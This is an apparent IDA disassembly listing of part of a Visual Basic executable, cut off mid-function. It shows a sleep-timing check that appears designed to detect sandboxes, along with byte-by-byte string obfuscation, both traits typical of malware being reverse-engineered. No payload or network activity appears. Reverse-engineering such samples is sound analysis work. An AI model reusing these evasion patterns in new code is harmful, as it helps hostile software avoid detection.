.text:0040BF60                 pop     edi
.text:0040BF61                 pop     esi
.text:0040BF62                 pop     ebx
.text:0040BF63                 leave
.text:0040BF64                 retn    8
.text:0040BF64 sub_40BD75      endp ; sp-analysis failed
.text:0040BF64
.text:0040BF67
.text:0040BF67 ; =============== S U B R O U T I N E =======================================
.text:0040BF67
.text:0040BF67 ; Attributes: bp-based frame
.text:0040BF67
.text:0040BF67 sub_40BF67      proc near               ; DATA XREF: .text:00401650↑o
.text:0040BF67
.text:0040BF67 var_38          = dword ptr -38h
.text:0040BF67 var_34          = dword ptr -34h
.text:0040BF67 var_30          = dword ptr -30h
.text:0040BF67 var_2C          = dword ptr -2Ch
.text:0040BF67 var_28          = dword ptr -28h
.text:0040BF67 var_24          = dword ptr -24h
.text:0040BF67 var_20          = dword ptr -20h
.text:0040BF67 var_1C          = dword ptr -1Ch
.text:0040BF67 var_18          = dword ptr -18h
.text:0040BF67 var_14          = dword ptr -14h
.text:0040BF67 var_10          = dword ptr -10h
.text:0040BF67 var_C           = dword ptr -0Ch
.text:0040BF67 var_8           = dword ptr -8
.text:0040BF67 var_4           = dword ptr -4
.text:0040BF67
.text:0040BF67                 push    ebp
.text:0040BF68                 mov     ebp, esp
.text:0040BF6A                 push    38h ; '8'
.text:0040BF6C                 pop     eax
.text:0040BF6D                 call    __vbaChkstk
.text:0040BF72                 call    sub_40D2C7
.text:0040BF77                 call    sub_40A806
.text:0040BF7C                 cmp     dword_40E0AC, 0
.text:0040BF83                 jnz     short loc_40BF9D
.text:0040BF85                 push    offset dword_40E0AC
.text:0040BF8A                 push    offset dword_401960
.text:0040BF8F                 call    __vbaNew2
.text:0040BF94                 mov     [ebp+var_C], offset dword_40E0AC
.text:0040BF9B                 jmp     short loc_40BFA4
.text:0040BF9D ; ---------------------------------------------------------------------------
.text:0040BF9D
.text:0040BF9D loc_40BF9D:                             ; CODE XREF: sub_40BF67+1C↑j
.text:0040BF9D                 mov     [ebp+var_C], offset dword_40E0AC
.text:0040BFA4
.text:0040BFA4 loc_40BFA4:                             ; CODE XREF: sub_40BF67+34↑j
.text:0040BFA4                 mov     eax, [ebp+var_C]
.text:0040BFA7                 mov     eax, [eax]
.text:0040BFA9                 mov     [ebp+var_4], eax
.text:0040BFAC                 push    offset sub_40D0DD
.text:0040BFB1                 push    offset unk_40E108
.text:0040BFB6                 push    offset dword_40E078
.text:0040BFBB                 mov     eax, [ebp+var_4]
.text:0040BFBE                 mov     eax, [eax]
.text:0040BFC0                 push    [ebp+var_4]
.text:0040BFC3                 call    dword ptr [eax+20h]
.text:0040BFC6                 fnclex
.text:0040BFC8                 mov     [ebp+var_8], eax
.text:0040BFCB                 cmp     [ebp+var_8], 0
.text:0040BFCF                 jge     short loc_40BFE8
.text:0040BFD1                 push    20h ; ' '
.text:0040BFD3                 push    offset dword_4027CC
.text:0040BFD8                 push    [ebp+var_4]
.text:0040BFDB                 push    [ebp+var_8]
.text:0040BFDE                 call    __vbaHresultCheckObj
.text:0040BFE3                 mov     [ebp+var_10], eax
.text:0040BFE6                 jmp     short loc_40BFEC
.text:0040BFE8 ; ---------------------------------------------------------------------------
.text:0040BFE8
.text:0040BFE8 loc_40BFE8:                             ; CODE XREF: sub_40BF67+68↑j
.text:0040BFE8                 and     [ebp+var_10], 0
.text:0040BFEC
.text:0040BFEC loc_40BFEC:                             ; CODE XREF: sub_40BF67+7F↑j
.text:0040BFEC                 cmp     dword_40E0AC, 0
.text:0040BFF3                 jnz     short loc_40C00D
.text:0040BFF5                 push    offset dword_40E0AC
.text:0040BFFA                 push    offset dword_401960
.text:0040BFFF                 call    __vbaNew2
.text:0040C004                 mov     [ebp+var_14], offset dword_40E0AC
.text:0040C00B                 jmp     short loc_40C014
.text:0040C00D ; ---------------------------------------------------------------------------
.text:0040C00D
.text:0040C00D loc_40C00D:                             ; CODE XREF: sub_40BF67+8C↑j
.text:0040C00D                 mov     [ebp+var_14], offset dword_40E0AC
.text:0040C014
.text:0040C014 loc_40C014:                             ; CODE XREF: sub_40BF67+A4↑j
.text:0040C014                 mov     eax, [ebp+var_14]
.text:0040C017                 mov     eax, [eax]
.text:0040C019                 mov     [ebp+var_4], eax
.text:0040C01C                 push    offset sub_40A4A1
.text:0040C021                 push    offset unk_40E108
.text:0040C026                 push    offset dword_40E078
.text:0040C02B                 mov     eax, [ebp+var_4]
.text:0040C02E                 mov     eax, [eax]
.text:0040C030                 push    [ebp+var_4]
.text:0040C033                 call    dword ptr [eax+20h]
.text:0040C036                 fnclex
.text:0040C038                 mov     [ebp+var_8], eax
.text:0040C03B                 cmp     [ebp+var_8], 0
.text:0040C03F                 jge     short loc_40C058
.text:0040C041                 push    20h ; ' '
.text:0040C043                 push    offset dword_4027CC
.text:0040C048                 push    [ebp+var_4]
.text:0040C04B                 push    [ebp+var_8]
.text:0040C04E                 call    __vbaHresultCheckObj
.text:0040C053                 mov     [ebp+var_18], eax
.text:0040C056                 jmp     short loc_40C05C
.text:0040C058 ; ---------------------------------------------------------------------------
.text:0040C058
.text:0040C058 loc_40C058:                             ; CODE XREF: sub_40BF67+D8↑j
.text:0040C058                 and     [ebp+var_18], 0
.text:0040C05C
.text:0040C05C loc_40C05C:                             ; CODE XREF: sub_40BF67+EF↑j
.text:0040C05C                 cmp     dword_40E0AC, 0
.text:0040C063                 jnz     short loc_40C07D
.text:0040C065                 push    offset dword_40E0AC
.text:0040C06A                 push    offset dword_401960
.text:0040C06F                 call    __vbaNew2
.text:0040C074                 mov     [ebp+var_1C], offset dword_40E0AC
.text:0040C07B                 jmp     short loc_40C084
.text:0040C07D ; ---------------------------------------------------------------------------
.text:0040C07D
.text:0040C07D loc_40C07D:                             ; CODE XREF: sub_40BF67+FC↑j
.text:0040C07D                 mov     [ebp+var_1C], offset dword_40E0AC
.text:0040C084
.text:0040C084 loc_40C084:                             ; CODE XREF: sub_40BF67+114↑j
.text:0040C084                 mov     eax, [ebp+var_1C]
.text:0040C087                 mov     eax, [eax]
.text:0040C089                 mov     [ebp+var_4], eax
.text:0040C08C                 push    offset sub_40A502
.text:0040C091                 push    offset unk_40E0FC
.text:0040C096                 push    offset unk_40E148
.text:0040C09B                 mov     eax, [ebp+var_4]
.text:0040C09E                 mov     eax, [eax]
.text:0040C0A0                 push    [ebp+var_4]
.text:0040C0A3                 call    dword ptr [eax+20h]
.text:0040C0A6                 fnclex
.text:0040C0A8                 mov     [ebp+var_8], eax
.text:0040C0AB                 cmp     [ebp+var_8], 0
.text:0040C0AF                 jge     short loc_40C0C8
.text:0040C0B1                 push    20h ; ' '
.text:0040C0B3                 push    offset dword_4027CC
.text:0040C0B8                 push    [ebp+var_4]
.text:0040C0BB                 push    [ebp+var_8]
.text:0040C0BE                 call    __vbaHresultCheckObj
.text:0040C0C3                 mov     [ebp+var_20], eax
.text:0040C0C6                 jmp     short loc_40C0CC
.text:0040C0C8 ; ---------------------------------------------------------------------------
.text:0040C0C8
.text:0040C0C8 loc_40C0C8:                             ; CODE XREF: sub_40BF67+148↑j
.text:0040C0C8                 and     [ebp+var_20], 0
.text:0040C0CC
.text:0040C0CC loc_40C0CC:                             ; CODE XREF: sub_40BF67+15F↑j
.text:0040C0CC                 cmp     dword_40E0AC, 0
.text:0040C0D3                 jnz     short loc_40C0ED
.text:0040C0D5                 push    offset dword_40E0AC
.text:0040C0DA                 push    offset dword_401960
.text:0040C0DF                 call    __vbaNew2
.text:0040C0E4                 mov     [ebp+var_24], offset dword_40E0AC
.text:0040C0EB                 jmp     short loc_40C0F4
.text:0040C0ED ; ---------------------------------------------------------------------------
.text:0040C0ED
.text:0040C0ED loc_40C0ED:                             ; CODE XREF: sub_40BF67+16C↑j
.text:0040C0ED                 mov     [ebp+var_24], offset dword_40E0AC
.text:0040C0F4
.text:0040C0F4 loc_40C0F4:                             ; CODE XREF: sub_40BF67+184↑j
.text:0040C0F4                 mov     eax, [ebp+var_24]
.text:0040C0F7                 mov     eax, [eax]
.text:0040C0F9                 mov     [ebp+var_4], eax
.text:0040C0FC                 push    offset sub_40D1A8
.text:0040C101                 push    offset unk_40E128
.text:0040C106                 push    offset dword_40E078
.text:0040C10B                 mov     eax, [ebp+var_4]
.text:0040C10E                 mov     eax, [eax]
.text:0040C110                 push    [ebp+var_4]
.text:0040C113                 call    dword ptr [eax+20h]
.text:0040C116                 fnclex
.text:0040C118                 mov     [ebp+var_8], eax
.text:0040C11B                 cmp     [ebp+var_8], 0
.text:0040C11F                 jge     short loc_40C138
.text:0040C121                 push    20h ; ' '
.text:0040C123                 push    offset dword_4027CC
.text:0040C128                 push    [ebp+var_4]
.text:0040C12B                 push    [ebp+var_8]
.text:0040C12E                 call    __vbaHresultCheckObj
.text:0040C133                 mov     [ebp+var_28], eax
.text:0040C136                 jmp     short loc_40C13C
.text:0040C138 ; ---------------------------------------------------------------------------
.text:0040C138
.text:0040C138 loc_40C138:                             ; CODE XREF: sub_40BF67+1B8↑j
.text:0040C138                 and     [ebp+var_28], 0
.text:0040C13C
.text:0040C13C loc_40C13C:                             ; CODE XREF: sub_40BF67+1CF↑j
.text:0040C13C                 cmp     dword_40E0AC, 0
.text:0040C143                 jnz     short loc_40C15D
.text:0040C145                 push    offset dword_40E0AC
.text:0040C14A                 push    offset dword_401960
.text:0040C14F                 call    __vbaNew2
.text:0040C154                 mov     [ebp+var_2C], offset dword_40E0AC
.text:0040C15B                 jmp     short loc_40C164
.text:0040C15D ; ---------------------------------------------------------------------------
.text:0040C15D
.text:0040C15D loc_40C15D:                             ; CODE XREF: sub_40BF67+1DC↑j
.text:0040C15D                 mov     [ebp+var_2C], offset dword_40E0AC
.text:0040C164
.text:0040C164 loc_40C164:                             ; CODE XREF: sub_40BF67+1F4↑j
.text:0040C164                 mov     eax, [ebp+var_2C]
.text:0040C167                 mov     eax, [eax]
.text:0040C169                 mov     [ebp+var_4], eax
.text:0040C16C                 push    offset sub_40D139
.text:0040C171                 push    offset unk_40E134
.text:0040C176                 push    offset dword_40E078
.text:0040C17B                 mov     eax, [ebp+var_4]
.text:0040C17E                 mov     eax, [eax]
.text:0040C180                 push    [ebp+var_4]
.text:0040C183                 call    dword ptr [eax+20h]
.text:0040C186                 fnclex
.text:0040C188                 mov     [ebp+var_8], eax
.text:0040C18B                 cmp     [ebp+var_8], 0
.text:0040C18F                 jge     short loc_40C1A8
.text:0040C191                 push    20h ; ' '
.text:0040C193                 push    offset dword_4027CC
.text:0040C198                 push    [ebp+var_4]
.text:0040C19B                 push    [ebp+var_8]
.text:0040C19E                 call    __vbaHresultCheckObj
.text:0040C1A3                 mov     [ebp+var_30], eax
.text:0040C1A6                 jmp     short loc_40C1AC
.text:0040C1A8 ; ---------------------------------------------------------------------------
.text:0040C1A8
.text:0040C1A8 loc_40C1A8:                             ; CODE XREF: sub_40BF67+228↑j
.text:0040C1A8                 and     [ebp+var_30], 0
.text:0040C1AC
.text:0040C1AC loc_40C1AC:                             ; CODE XREF: sub_40BF67+23F↑j
.text:0040C1AC                 cmp     dword_40E0AC, 0
.text:0040C1B3                 jnz     short loc_40C1CD
.text:0040C1B5                 push    offset dword_40E0AC
.text:0040C1BA                 push    offset dword_401960
.text:0040C1BF                 call    __vbaNew2
.text:0040C1C4                 mov     [ebp+var_34], offset dword_40E0AC
.text:0040C1CB                 jmp     short loc_40C1D4
.text:0040C1CD ; ---------------------------------------------------------------------------
.text:0040C1CD
.text:0040C1CD loc_40C1CD:                             ; CODE XREF: sub_40BF67+24C↑j
.text:0040C1CD                 mov     [ebp+var_34], offset dword_40E0AC
.text:0040C1D4
.text:0040C1D4 loc_40C1D4:                             ; CODE XREF: sub_40BF67+264↑j
.text:0040C1D4                 mov     eax, [ebp+var_34]
.text:0040C1D7                 mov     eax, [eax]
.text:0040C1D9                 mov     [ebp+var_4], eax
.text:0040C1DC                 mov     eax, [ebp+var_4]
.text:0040C1DF                 mov     eax, [eax]
.text:0040C1E1                 push    [ebp+var_4]
.text:0040C1E4                 call    dword ptr [eax+34h]
.text:0040C1E7                 fnclex
.text:0040C1E9                 mov     [ebp+var_8], eax
.text:0040C1EC                 cmp     [ebp+var_8], 0
.text:0040C1F0                 jge     short loc_40C209
.text:0040C1F2                 push    34h ; '4'
.text:0040C1F4                 push    offset dword_4027CC
.text:0040C1F9                 push    [ebp+var_4]
.text:0040C1FC                 push    [ebp+var_8]
.text:0040C1FF                 call    __vbaHresultCheckObj
.text:0040C204                 mov     [ebp+var_38], eax
.text:0040C207                 jmp     short loc_40C20D
.text:0040C209 ; ---------------------------------------------------------------------------
.text:0040C209
.text:0040C209 loc_40C209:                             ; CODE XREF: sub_40BF67+289↑j
.text:0040C209                 and     [ebp+var_38], 0
.text:0040C20D
.text:0040C20D loc_40C20D:                             ; CODE XREF: sub_40BF67+2A0↑j
.text:0040C20D                 mov     dword_40E140, 118Fh
.text:0040C217                 call    sub_40C238
.text:0040C21C                 cmp     ax, 0FFFFh
.text:0040C220                 jnz     short loc_40C224
.text:0040C222                 jmp     short locret_40C236
.text:0040C224 ; ---------------------------------------------------------------------------
.text:0040C224
.text:0040C224 loc_40C224:                             ; CODE XREF: sub_40BF67+2B9↑j
.text:0040C224                 push    0
.text:0040C226                 push    0
.text:0040C228                 push    0
.text:0040C22A                 push    0
.text:0040C22C                 push    offset sub_40D3DE
.text:0040C231                 call    sub_40A502
.text:0040C236
.text:0040C236 locret_40C236:                          ; CODE XREF: sub_40BF67+2BB↑j
.text:0040C236                 leave
.text:0040C237                 retn
.text:0040C237 sub_40BF67      endp ; sp-analysis failed
.text:0040C237
.text:0040C238
.text:0040C238 ; =============== S U B R O U T I N E =======================================
.text:0040C238
.text:0040C238 ; Attributes: bp-based frame
.text:0040C238
.text:0040C238 sub_40C238      proc near               ; CODE XREF: sub_40BF67+2B0↑p
.text:0040C238
.text:0040C238 var_10          = dword ptr -10h
.text:0040C238 var_C           = word ptr -0Ch
.text:0040C238 var_8           = dword ptr -8
.text:0040C238 var_4           = dword ptr -4
.text:0040C238
.text:0040C238                 push    ebp
.text:0040C239                 mov     ebp, esp
.text:0040C23B                 push    10h
.text:0040C23D                 pop     eax
.text:0040C23E                 call    __vbaChkstk
.text:0040C243                 call    sub_402958
.text:0040C248                 mov     [ebp+var_10], eax
.text:0040C24B                 call    __vbaSetSystemError
.text:0040C250                 mov     eax, [ebp+var_10]
.text:0040C253                 mov     [ebp+var_8], eax
.text:0040C256                 push    0
.text:0040C258                 push    3A98h
.text:0040C25D                 call    sub_402998
.text:0040C262                 call    __vbaSetSystemError
.text:0040C267                 call    sub_402958
.text:0040C26C                 mov     [ebp+var_10], eax
.text:0040C26F                 call    __vbaSetSystemError
.text:0040C274                 mov     eax, [ebp+var_10]
.text:0040C277                 mov     [ebp+var_4], eax
.text:0040C27A                 mov     eax, [ebp+var_4]
.text:0040C27D                 sub     eax, [ebp+var_8]
.text:0040C280                 jo      short loc_40C29B
.text:0040C282                 cmp     eax, 3A98h
.text:0040C287                 jge     short loc_40C290
.text:0040C289                 or      [ebp+var_C], 0FFFFh
.text:0040C28E                 jmp     short loc_40C295
.text:0040C290 ; ---------------------------------------------------------------------------
.text:0040C290
.text:0040C290 loc_40C290:                             ; CODE XREF: sub_40C238+4F↑j
.text:0040C290                 and     [ebp+var_C], 0
.text:0040C295
.text:0040C295 loc_40C295:                             ; CODE XREF: sub_40C238+56↑j
.text:0040C295                 mov     ax, [ebp+var_C]
.text:0040C299                 leave
.text:0040C29A                 retn
.text:0040C29B ; ---------------------------------------------------------------------------
.text:0040C29B
.text:0040C29B loc_40C29B:                             ; CODE XREF: sub_40C238+48↑j
.text:0040C29B                 call    __vbaErrorOverflow
.text:0040C29B sub_40C238      endp
.text:0040C29B
.text:0040C2A0
.text:0040C2A0 ; =============== S U B R O U T I N E =======================================
.text:0040C2A0
.text:0040C2A0 ; Attributes: bp-based frame
.text:0040C2A0
.text:0040C2A0 sub_40C2A0      proc near               ; CODE XREF: sub_40D3DE+32↓p
.text:0040C2A0
.text:0040C2A0 var_34          = dword ptr -34h
.text:0040C2A0 var_30          = dword ptr -30h
.text:0040C2A0 var_28          = dword ptr -28h
.text:0040C2A0 var_24          = dword ptr -24h
.text:0040C2A0 var_20          = dword ptr -20h
.text:0040C2A0 var_1C          = byte ptr -1Ch
.text:0040C2A0 var_18          = dword ptr -18h
.text:0040C2A0 var_14          = dword ptr -14h
.text:0040C2A0 var_10          = dword ptr -10h
.text:0040C2A0 var_8           = dword ptr -8
.text:0040C2A0 var_4           = dword ptr -4
.text:0040C2A0
.text:0040C2A0                 push    ebp
.text:0040C2A1                 mov     ebp, esp
.text:0040C2A3                 push    ecx
.text:0040C2A4                 push    ecx
.text:0040C2A5                 push    offset __vbaExceptHandler
.text:0040C2AA                 mov     eax, large fs:0
.text:0040C2B0                 push    eax
.text:0040C2B1                 mov     large fs:0, esp
.text:0040C2B8                 push    24h ; '$'
.text:0040C2BA                 pop     eax
.text:0040C2BB                 call    __vbaChkstk
.text:0040C2C0                 push    ebx
.text:0040C2C1                 push    esi
.text:0040C2C2                 push    edi
.text:0040C2C3                 mov     [ebp+var_8], esp
.text:0040C2C6                 mov     [ebp+var_4], offset dword_401318
.text:0040C2CD                 mov     edx, offset aPiabdyoxwacnyt ; "piabdyoxwacnytilhpcudssbyalbkixduolugum"...
.text:0040C2D2                 lea     ecx, [ebp+var_14]
.text:0040C2D5                 call    __vbaStrCopy
.text:0040C2DA                 lea     eax, [ebp+var_14]
.text:0040C2DD                 push    eax
.text:0040C2DE                 call    sub_40A464
.text:0040C2E3                 mov     [ebp+var_20], eax
.text:0040C2E6                 cmp     dword_40E0AC, 0
.text:0040C2ED                 jnz     short loc_40C307
.text:0040C2EF                 push    offset dword_40E0AC
.text:0040C2F4                 push    offset dword_401960
.text:0040C2F9                 call    __vbaNew2
.text:0040C2FE                 mov     [ebp+var_30], offset dword_40E0AC
.text:0040C305                 jmp     short loc_40C30E
.text:0040C307 ; ---------------------------------------------------------------------------
.text:0040C307
.text:0040C307 loc_40C307:                             ; CODE XREF: sub_40C2A0+4D↑j
.text:0040C307                 mov     [ebp+var_30], offset dword_40E0AC
.text:0040C30E
.text:0040C30E loc_40C30E:                             ; CODE XREF: sub_40C2A0+65↑j
.text:0040C30E                 mov     eax, [ebp+var_30]
.text:0040C311                 mov     eax, [eax]
.text:0040C313                 mov     [ebp+var_24], eax
.text:0040C316                 and     [ebp+var_18], 0
.text:0040C31A                 lea     eax, [ebp+var_1C]
.text:0040C31D                 push    eax
.text:0040C31E                 lea     eax, [ebp+var_18]
.text:0040C321                 push    eax
.text:0040C322                 push    0
.text:0040C324                 push    0
.text:0040C326                 push    [ebp+var_20]
.text:0040C329                 push    dword_40E0B8
.text:0040C32F                 mov     eax, [ebp+var_24]
.text:0040C332                 mov     eax, [eax]
.text:0040C334                 push    [ebp+var_24]
.text:0040C337                 call    dword ptr [eax+1Ch]
.text:0040C33A                 fnclex
.text:0040C33C                 mov     [ebp+var_28], eax
.text:0040C33F                 cmp     [ebp+var_28], 0
.text:0040C343                 jge     short loc_40C35C
.text:0040C345                 push    1Ch
.text:0040C347                 push    offset dword_4027CC
.text:0040C34C                 push    [ebp+var_24]
.text:0040C34F                 push    [ebp+var_28]
.text:0040C352                 call    __vbaHresultCheckObj
.text:0040C357                 mov     [ebp+var_34], eax
.text:0040C35A                 jmp     short loc_40C360
.text:0040C35C ; ---------------------------------------------------------------------------
.text:0040C35C
.text:0040C35C loc_40C35C:                             ; CODE XREF: sub_40C2A0+A3↑j
.text:0040C35C                 and     [ebp+var_34], 0
.text:0040C360
.text:0040C360 loc_40C360:                             ; CODE XREF: sub_40C2A0+BA↑j
.text:0040C360                 mov     edx, [ebp+var_14]
.text:0040C363                 mov     ecx, offset dword_40E09C
.text:0040C368                 call    __vbaStrCopy
.text:0040C36D                 push    offset loc_40C37B
.text:0040C372
.text:0040C372 loc_40C372:                             ; DATA XREF: .text:00401320↑o
.text:0040C372                 lea     ecx, [ebp+var_14]
.text:0040C375                 call    __vbaFreeStr
.text:0040C37A                 retn
.text:0040C37B ; ---------------------------------------------------------------------------
.text:0040C37B
.text:0040C37B loc_40C37B:                             ; DATA XREF: sub_40C2A0+CD↑o
.text:0040C37B                 mov     ecx, [ebp+var_10]
.text:0040C37E                 mov     large fs:0, ecx
.text:0040C385                 pop     edi
.text:0040C386                 pop     esi
.text:0040C387                 pop     ebx
.text:0040C388                 leave
.text:0040C389                 retn
.text:0040C389 sub_40C2A0      endp ; sp-analysis failed
.text:0040C389
.text:0040C38A
.text:0040C38A ; =============== S U B R O U T I N E =======================================
.text:0040C38A
.text:0040C38A ; Attributes: bp-based frame
.text:0040C38A
.text:0040C38A sub_40C38A      proc near               ; CODE XREF: sub_40D3DE+37↓p
.text:0040C38A                                         ; sub_40D3DE+3C↓p ...
.text:0040C38A                 push    ebp
.text:0040C38B                 mov     ebp, esp
.text:0040C38D                 pop     ebp
.text:0040C38E                 retn
.text:0040C38E sub_40C38A      endp
.text:0040C38E
.text:0040C38F
.text:0040C38F ; =============== S U B R O U T I N E =======================================
.text:0040C38F
.text:0040C38F ; Attributes: bp-based frame
.text:0040C38F
.text:0040C38F sub_40C38F      proc near               ; CODE XREF: sub_40D3DE+87↓p
.text:0040C38F                                         ; sub_40D3DE+197↓p
.text:0040C38F
.text:0040C38F var_118         = dword ptr -118h
.text:0040C38F var_114         = dword ptr -114h
.text:0040C38F var_110         = dword ptr -110h
.text:0040C38F var_10C         = dword ptr -10Ch
.text:0040C38F var_108         = dword ptr -108h
.text:0040C38F var_104         = qword ptr -104h
.text:0040C38F var_FC          = dword ptr -0FCh
.text:0040C38F var_F8          = dword ptr -0F8h
.text:0040C38F var_F4          = dword ptr -0F4h
.text:0040C38F var_F0          = dword ptr -0F0h
.text:0040C38F var_EC          = dword ptr -0ECh
.text:0040C38F var_E8          = qword ptr -0E8h
.text:0040C38F var_E0          = dword ptr -0E0h
.text:0040C38F var_DC          = dword ptr -0DCh
.text:0040C38F var_D8          = dword ptr -0D8h
.text:0040C38F var_D4          = dword ptr -0D4h
.text:0040C38F var_D0          = dword ptr -0D0h
.text:0040C38F var_CC          = dword ptr -0CCh
.text:0040C38F var_C8          = dword ptr -0C8h
.text:0040C38F var_C4          = dword ptr -0C4h
.text:0040C38F var_BC          = dword ptr -0BCh
.text:0040C38F var_B8          = dword ptr -0B8h
.text:0040C38F var_B4          = dword ptr -0B4h
.text:0040C38F var_B0          = dword ptr -0B0h
.text:0040C38F var_AC          = dword ptr -0ACh
.text:0040C38F var_A8          = dword ptr -0A8h
.text:0040C38F var_A4          = dword ptr -0A4h
.text:0040C38F var_A0          = byte ptr -0A0h
.text:0040C38F var_9C          = dword ptr -9Ch
.text:0040C38F var_98          = dword ptr -98h
.text:0040C38F var_94          = dword ptr -94h
.text:0040C38F var_90          = dword ptr -90h
.text:0040C38F var_8C          = dword ptr -8Ch
.text:0040C38F var_88          = dword ptr -88h
.text:0040C38F var_84          = dword ptr -84h
.text:0040C38F var_80          = dword ptr -80h
.text:0040C38F var_7C          = dword ptr -7Ch
.text:0040C38F var_78          = dword ptr -78h
.text:0040C38F var_74          = dword ptr -74h
.text:0040C38F var_70          = dword ptr -70h
.text:0040C38F var_6C          = dword ptr -6Ch
.text:0040C38F var_68          = dword ptr -68h
.text:0040C38F var_64          = dword ptr -64h
.text:0040C38F var_5C          = dword ptr -5Ch
.text:0040C38F var_54          = dword ptr -54h
.text:0040C38F var_4C          = dword ptr -4Ch
.text:0040C38F var_44          = dword ptr -44h
.text:0040C38F var_40          = dword ptr -40h
.text:0040C38F var_3C          = dword ptr -3Ch
.text:0040C38F var_38          = byte ptr -38h
.text:0040C38F var_34          = byte ptr -34h
.text:0040C38F var_30          = dword ptr -30h
.text:0040C38F var_2C          = dword ptr -2Ch
.text:0040C38F var_28          = dword ptr -28h
.text:0040C38F var_24          = dword ptr -24h
.text:0040C38F var_20          = dword ptr -20h
.text:0040C38F var_1C          = byte ptr -1Ch
.text:0040C38F var_18          = dword ptr -18h
.text:0040C38F var_14          = word ptr -14h
.text:0040C38F var_10          = dword ptr -10h
.text:0040C38F var_8           = dword ptr -8
.text:0040C38F var_4           = dword ptr -4
.text:0040C38F arg_0           = dword ptr  8
.text:0040C38F arg_4           = dword ptr  0Ch
.text:0040C38F arg_8           = dword ptr  10h
.text:0040C38F
.text:0040C38F                 push    ebp
.text:0040C390                 mov     ebp, esp
.text:0040C392                 push    ecx
.text:0040C393                 push    ecx
.text:0040C394                 push    offset __vbaExceptHandler
.text:0040C399                 mov     eax, large fs:0
.text:0040C39F                 push    eax
.text:0040C3A0                 mov     large fs:0, esp
.text:0040C3A7                 mov     eax, 108h
.text:0040C3AC                 call    __vbaChkstk
.text:0040C3B1                 push    ebx
.text:0040C3B2                 push    esi
.text:0040C3B3                 push    edi
.text:0040C3B4                 mov     [ebp+var_8], esp
.text:0040C3B7                 mov     [ebp+var_4], offset dword_401330
.text:0040C3BE                 mov     edx, [ebp+arg_4]
.text:0040C3C1                 lea     ecx, [ebp+var_20]
.text:0040C3C4                 call    __vbaStrCopy
.text:0040C3C9                 push    0
.text:0040C3CB                 push    23h ; '#'
.text:0040C3CD                 push    1
.text:0040C3CF                 push    11h
.text:0040C3D1                 lea     eax, [ebp+var_2C]
.text:0040C3D4                 push    eax
.text:0040C3D5                 push    1
.text:0040C3D7                 push    80h
.text:0040C3DC                 call    __vbaRedim
.text:0040C3E1                 add     esp, 1Ch
.text:0040C3E4                 mov     cx, 63h ; 'c'
.text:0040C3E8                 call    __vbaUI1I2
.text:0040C3ED                 mov     ecx, [ebp+var_2C]
.text:0040C3F0                 xor     edx, edx
.text:0040C3F2                 sub     edx, [ecx+14h]
.text:0040C3F5                 mov     ecx, [ebp+var_2C]
.text:0040C3F8                 mov     ecx, [ecx+0Ch]
.text:0040C3FB                 mov     [ecx+edx], al
.text:0040C3FE                 mov     cx, 65h ; 'e'
.text:0040C402                 call    __vbaUI1I2
.text:0040C407                 mov     ecx, [ebp+var_2C]
.text:0040C40A                 push    1
.text:0040C40C                 pop     edx
.text:0040C40D                 sub     edx, [ecx+14h]
.text:0040C410                 mov     ecx, [ebp+var_2C]
.text:0040C413                 mov     ecx, [ecx+0Ch]
.text:0040C416                 mov     [ecx+edx], al
.text:0040C419                 mov     cx, 72h ; 'r'
.text:0040C41D                 call    __vbaUI1I2
.text:0040C422                 mov     ecx, [ebp+var_2C]
.text:0040C425                 push    2
.text:0040C427                 pop     edx
.text:0040C428                 sub     edx, [ecx+14h]
.text:0040C42B                 mov     ecx, [ebp+var_2C]
.text:0040C42E                 mov     ecx, [ecx+0Ch]
.text:0040C431                 mov     [ecx+edx], al
.text:0040C434                 mov     cx, 76h ; 'v'
.text:0040C438                 call    __vbaUI1I2
.text:0040C43D                 mov     ecx, [ebp+var_2C]
.text:0040C440                 push    3
.text:0040C442                 pop     edx
.text:0040C443                 sub     edx, [ecx+14h]
.text:0040C446                 mov     ecx, [ebp+var_2C]
.text:0040C449                 mov     ecx, [ecx+0Ch]
.text:0040C44C                 mov     [ecx+edx], al
.text:0040C44F                 mov     cx, 69h ; 'i'
.text:0040C453                 call    __vbaUI1I2
.text:0040C458                 mov     ecx, [ebp+var_2C]
.text:0040C45B                 push    4
.text:0040C45D                 pop     edx
.text:0040C45E                 sub     edx, [ecx+14h]
.text:0040C461                 mov     ecx, [ebp+var_2C]
.text:0040C464                 mov     ecx, [ecx+0Ch]
.text:0040C467                 mov     [ecx+edx], al
.text:0040C46A                 mov     cx, 78h ; 'x'
.text:0040C46E                 call    __vbaUI1I2
.text:0040C473                 mov     ecx, [ebp+var_2C]
.text:0040C476                 push    5
.text:0040C478                 pop     edx
.text:0040C479                 sub     edx, [ecx+14h]
.text:0040C47C                 mov     ecx, [ebp+var_2C]
.text:0040C47F                 mov     ecx, [ecx+0Ch]
.text:0040C482                 mov     [ecx+edx], al
.text:0040C485                 mov     cx, 65h ; 'e'
.text:0040C489                 call    __vbaUI1I2
.text:0040C48E                 mov     ecx, [ebp+var_2C]
.text:0040C491                 push    6
.text:0040C493                 pop     edx
.text:0040C494                 sub     edx, [ecx+14h]
.text:0040C497                 mov     ecx, [ebp+var_2C]
.text:0040C49A                 mov     ecx, [ecx+0Ch]
.text:0040C49D                 mov     [ecx+edx], al
.text:0040C4A0                 mov     cx, 73h ; 's'
.text:0040C4A4                 call    __vbaUI1I2
.text:0040C4A9                 mov     ecx, [ebp+var_2C]
.text:0040C4AC                 push    7
.text:0040C4AE                 pop     edx
.text:0040C4AF                 sub     edx, [ecx+14h]
.text:0040C4B2                 mov     ecx, [ebp+var_2C]
.text:0040C4B5                 mov     ecx, [ecx+0Ch]
.text:0040C4B8                 mov     [ecx+edx], al
.text:0040C4BB                 mov     cx, 63h ; 'c'
.text:0040C4BF                 call    __vbaUI1I2
.text:0040C4C4                 mov     ecx, [ebp+var_2C]
.text:0040C4C7                 push    8
.text:0040C4C9                 pop     edx
.text:0040C4CA                 sub     edx, [ecx+14h]
.text:0040C4CD                 mov     ecx, [ebp+var_2C]
.text:0040C4D0                 mov     ecx, [ecx+0Ch]
.text:0040C4D3                 mov     [ecx+edx], al
.text:0040C4D6                 mov     cx, 6Fh ; 'o'
.text:0040C4DA                 call    __vbaUI1I2
.text:0040C4DF                 mov     ecx, [ebp+var_2C]
.text:0040C4E2                 push    9
.text:0040C4E4                 pop     edx
.text:0040C4E5                 sub     edx, [ecx+14h]
.text:0040C4E8                 mov     ecx, [ebp+var_2C]
.text:0040C4EB                 mov     ecx, [ecx+0Ch]
.text:0040C4EE                 mov     [ecx+edx], al
.text:0040C4F1                 mov     cx, 6Dh ; 'm'
.text:0040C4F5                 call    __vbaUI1I2
